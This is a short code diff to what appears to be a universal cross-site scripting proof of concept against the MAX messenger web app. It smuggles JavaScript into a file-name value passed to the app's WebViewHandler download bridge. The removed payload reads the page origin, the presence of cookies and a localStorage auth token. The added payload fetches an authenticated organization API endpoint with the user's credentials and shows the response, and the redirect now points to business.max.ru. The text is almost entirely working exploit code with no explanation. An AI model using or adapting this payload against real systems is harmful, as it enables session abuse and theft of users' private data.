@@ -5,7 +5,11 @@
      new Blob(['UXSS'], {type: 'text/plain'})
    );
  
- const fileName = `'+(()=>{let e=document.createElement("mark");e.id="max-uxss-marker";e.textContent="UXSS@"+location.origin+" c="+!!document.cookie+" l="+localStorage.__oneme_auth;document.title=e.textContent;document.documentElement.prepend(e);;return""})()+'`;
+ const fileName = `'+(()=>{fetch('/self/api/v1/organization',{method:'GET',credentials:'include'}).then(response => response.text()).then(data => {
+    let div = document.createElement('div');
+    div.textContent = data;
+    document.body.appendChild(div);
+})})()+'`;
  
  window.WebViewHandler.postEvent(
    'WebAppDownloadFile',
@@ -16,7 +20,7 @@
    })
  );
  
- location.replace('https://web.max.ru/');
+ location.replace('https://business.max.ru/');
   }
 </script>
 <script src="https://st.max.ru/js/max-web-app.js"></script>
